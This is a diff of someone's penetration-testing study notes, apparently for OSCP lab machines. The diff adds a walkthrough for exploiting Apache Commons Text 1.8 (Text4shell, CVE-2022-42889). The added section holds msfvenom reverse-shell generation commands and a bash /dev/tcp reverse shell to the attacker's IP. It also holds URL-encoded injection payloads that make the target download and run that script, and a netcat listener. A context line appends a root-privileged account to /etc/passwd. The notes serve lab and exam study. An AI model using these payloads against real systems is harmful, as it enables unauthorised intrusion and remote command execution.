@@ -1877,6 +1877,25 @@ DLYJ9ZDE6uY5o
 >echo "ashok:DLYJ9ZDE6uY5o:0:0:root:/root:/bin/bash" >> /etc/passwd
 >su ashok(#password is also ashok, switch directory to ashok get the flag)
 ```
+## Linux Shells and Apache Commons Text 1.8 (Text4shell), CVE-2022–42889
+- In nmap result has port 8080 http-proxy is open, using gobuster identifed /search, /CHANGELOG.
+- In /CHANGELOG shown "Added Apache Commons Text 1.8" leads to this link [Medium](https://medium.com/mii-cybersec/cve-2022-42889-text4shell-vulnerability-17b703a48dcd)
+- The traditional msfvenom payload is not working here worked [Discord](https://discord.com/channels/780824470113615893/1087927556604432424/1255218982634651793)
+- For reference OSCP B Berlin .150 the discord link.
+```bash
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f elf > linux1234.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f sh > linux1234.sh
+# These shells are downloaded from the python server but no shell, The IP Address kali IP Address
+
+# After Searching in the Medium link and Discord found this way to create shell
+echo "bash -i >& /dev/tcp/192.168.45.220/443 0>&1" > shell
+# In Browser
+http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27wget%20192.168.45.220%2Fshell%20-O%20%2Ftmp%2Fshell%27)%7D
+http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27bash%20%2Ftmp%2Fshell%27)%7D
+rlwrap nc -nlvp 443
+#Got shell
+```
+
 ## Exploiting Kernel Vulnerabilities
 ```bash
 cat /etc/issue (Ubuntu 16.04.4 LTS \n \l)
